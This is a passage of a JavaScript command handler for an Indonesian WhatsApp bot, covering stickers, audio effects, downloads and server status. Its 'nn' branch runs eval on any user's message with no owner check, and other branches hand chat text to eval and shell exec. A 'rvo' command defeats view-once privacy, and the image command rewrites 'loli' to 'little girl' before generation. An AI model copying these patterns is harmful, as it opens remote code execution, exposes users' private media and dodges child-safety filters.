.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
m?.reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return m?.reply('Isinya?')
m?.reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
//=================================================//
case 'bass': 
            case 'blown': 
            case 'deep': 
            case 'earrape': 
            case 'fast': 
            case 'fat': 
            case 'nightcore': 
            case 'reverse': 
            case 'robot': 
            case 'slow': 
            case 'smooth': 
            case 'tupai': {
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                let media = await ptz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                ptz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                }
            break
//=================================================//
case "jarak":{
var [fromo, to] = text.split`|`
if (!(fromo && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(fromo, to)
if (data.img) return ptz.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: m })
else m?.reply(data.desc)
}
break
//=================================================//
case "bot":
if (!isCreator) return
if (args[0] == "public") {
if (db.data.settings[botNumber].public == true) return m?.reply("Sudah Active")
db.data.settings[botNumber].public = true
m?.reply("Mode Public Telah Active")
} else if (args[0] == "self") {
if (db.data.settings[botNumber].public == false) return m?.reply("Sudah Off")
db.data.settings[botNumber].public = false
m?.reply("Mode Self Telah Active")
} else if (args[0] == "banchat") {
if (global.db.data.chats[m?.chat].isBanned = true) return m?.reply("Sudah Active")
global.db.data.chats[m?.chat].isBanned = true
m?.reply("berhasil banchat")
} else if (args[0] == "unbanchat") {
if (global.db.data.chats[m?.chat].isBanned = false) return m?.reply("Sudah Off")
global.db.data.chats[m?.chat].isBanned = false
m?.reply("berhasil unbanchat")
} else if (args[0] == "autoread") {
if (db.data.settings[botNumber].autoread == true) return m?.reply("Sudah Active")
db.data.settings[botNumber].autoread = true
m?.reply("Auto Read Telah Active")
} else if (args[0] == "Aautoread") {
if (db.data.settings[botNumber].autoread == false) return m?.reply("Sudah Off")
db.data.settings[botNumber].autoread = false
m?.reply("Auto Read Telah Off")
} else {
m?.reply(`${prefix}${command} public/self/banchat/unbanchat/Aautoread/autoread`)
}
break
//=================================================//
case 'cls': {
if (!m?.quoted) return m?.reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) ptz.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
//=================================================//
case 'tts':{
if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
ptz.sendMessage(m?.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
//=================================================//
case 'remini':{
if (!quoted) return m?.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m?.reply("hanya support gambar")
let media = await quoted.download()
const This = await remini(media, "enhance");
ptz.sendFile(m?.chat, This, "", "Done", m);
}
break
//=================================================//
case 'tiktok':
case 'tt': {
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok(`${args[0]}`)
ptz.sendMessage(m.chat, { video: { url: res.nowm }, caption: res.title, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
ptz.sendMessage(m.chat, { audio: { url: res.audio }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break
//=================================================//
case "get": {
if (!/^https?:\/\//.test(text)) return m?.reply('Awali *URL* dengan http:// atau https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return ptz.sendFile(m?.chat, url, 'file', `*Request By*:@${m?.sender.split('@')[0]}\n*Link:* ${text}\n\n2024 © KyuuRzy\n`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
m?.reply(txt.slice(0, 65536) + '')
}
}
break
//=================================================//
break;
case "rvo":
case "readvo":{
if (!m.quoted)
return m.reply("Reply gambar/video yang ingin Anda lihat");
if (m.quoted.mtype !== "viewOnceMessageV2")
return m.reply("Ini bukan pesan view-once.");
let msg = m.quoted.message;
let type = Object.keys(msg)[0];
let media = await downloadContentFromMessage(
msg[type],
type == "imageMessage" ? "image" : "video",
);
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}
if (/video/.test(type)) {
return ptz.sendFile(
m.chat,
buffer,
"media.mp4",
msg[type].caption || "",
m,
);
} else if (/image/.test(type)) {
return ptz.sendFile(
m.chat,
buffer,
"media.jpg",
msg[type].caption || "",
m,
);
}
}
break;
//=================================================//
case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else m?.reply("Input teks atau reply teks yang ingin di jadikan quote!")
if (!text) return m?.reply('masukan text')
if (text.length > 30) return m?.reply('Maksimal 30 Teks!')
let ppnyauser = await await ptz.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
ptz.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return m?.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m?.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return m?.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return m?.reply(respond)
if (!text) return m?.reply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ptz.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await ptz.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
}
break
 //=================================================//
case 'swm': {
let [teks1, teks2] = text.split`|`
if (!teks1) return m?.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (!teks2) return m?.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (/image/.test(mime)) {
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m?.reply('Maksimal 10 detik!')
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
return m?.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case "bingimg-2d": {
if (!text) return m?.reply("[ ! ] masukan prompt gambar yang mau di bikin");
let teksu = text.replace(/loli/gi, "anak gadis kecil");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
ptz.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: m });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m?.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await m?.reply('No images found after filtering.');
}
} catch (error) {
await m?.reply('An error occurred while processing the request.');
}
};
break
//=================================================//
case "ping":
case "botstatus":
case "statusbot": {
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();
let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm?.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
.join("\n\n")}`
: ""
}
`.trim();
ptz.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: respon,
contextInfo: {
mentionedJid: [m?.sender],
externalAdReply: {
showAdAttribution: true
}}}}}}, {})
}
break

default:
if (global.db.data.chats[m.chat].ai && body != undefined) {
let chats = await fetch(url).then(res => res.json())
m.reply(''+chats.result+'')
}
    
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m?.reply(bang)
}
try {
m?.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}
    
if (body.startsWith("nn")) {
        if (!q) return m.reply('codenya mana kak')
        syntaxerror = require('syntax-error')
        _syntax = ''
        _text = args.join(' ')
        try {
          evalll = await eval(`;(async () => { return ${args.join(' ')} })()`)
          m.reply(require('util').format(evalll))
        } catch (e) {
          let err = await syntaxerror(_text, 'Execution Function', {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true
          })
          if (err) _syntax = '```' + err + '```\n\n'
          _return = e
          await m.reply(_syntax + require('util').format(_return))
        }
      }

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m?.reply(`${err}`)
if (stdout) return m?.reply(stdout)
})
}

if ((m?.mtype === 'groupInviteMessage' || m?.text.startsWith('Undangan untuk bergabung') || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Buka tautan ini')) && !m?.isBaileys && !m?.isGroup) {
await ptz.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'group apa itu'
m?.reply(teks)
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
